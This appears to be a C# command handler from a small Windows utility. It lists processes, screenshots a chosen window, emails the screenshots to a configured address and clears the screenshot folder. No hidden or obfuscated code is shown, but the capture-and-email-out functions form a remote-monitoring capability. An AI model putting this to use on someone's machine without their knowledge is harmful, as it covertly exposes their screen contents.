using Beyond_Aiden.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Beyond_Aiden
{
  public enum CommandType {
    ListProcesses, WindowScreenshot, SendEmail, ClearScreenshots
  }

  class Command
  {
    private string command;
    private int commandType = -1;
    private string[] param;

    public Command(string command)
    {
      this.command = command;

      // Split the command
      // TO DO: Add regex for arguments
      string[] _command = command.Split(' ');
      List<string> _params = _command.ToList<string>();
      _params.RemoveAt(0);
      this.param = _params.ToArray();

      foreach (CommandType c in Enum.GetValues(typeof(CommandType)).Cast<CommandType>()) {
        try {
          if (Convert.ToInt32(_command[0]) == (int)c) {
            this.commandType = (int)c;
          }
        }
        catch (Exception) { }
      }

      if (commandType == -1) {
        throw new UnknownCommand();
      }
    }

    public string execute()
    {
      string result = "";

      switch (this.commandType) {
        case (int)CommandType.ListProcesses:
          List<Process> processList = WindowsSystem.ListProcesses();

          result += "--------------------------" + Environment.NewLine;
          processList.ForEach((process) => {
            result += String.Format("{0} (hWnd: {1})", process.MainWindowTitle, process.MainWindowHandle) + Environment.NewLine;
          });
          result += "--------------------------" + Environment.NewLine;

          break;
        case (int)CommandType.WindowScreenshot:
          if (this.param.Length == 0) {
            throw new MissingCommandParameter();
          }

          List<string> files = WindowsSystem.WindowScreenshot(param[0]);

          result += "--------------------------" + Environment.NewLine;
          result += String.Format("Screenshot list of '{0}':", param[0]) + Environment.NewLine;

          files.ForEach((file) => {
            result += "- " + file + Environment.NewLine;
          });

          // Check if needed to send them in email
          if (param.Length > 1) {
            Mail mail = new Mail(MailService.smtpMail, result, String.Format("Screenshots of '{0}'", param[0]));
            mail.addAttachment(files);
            MailService.Send(mail);
            result += String.Format("******* Screenshots emailed to {0}*******{1}", MailService.smtpMail, Environment.NewLine);
          }

          result += "--------------------------" + Environment.NewLine;

          break;
        case (int)CommandType.SendEmail:
          MailService.Send(new Mail(MailService.smtpMail, "Holaaaa"));
          result = "Mail sent to " + MailService.smtpMail;
          break;
        case (int)CommandType.ClearScreenshots:
          WindowsSystem.ClearScreenshotFolder();
          result = "Screenshots folder cleared successfuly";
          break;
        default:
          result = "Invalid command, please try again";
          break;
      }

      return result;
    }
  }
}
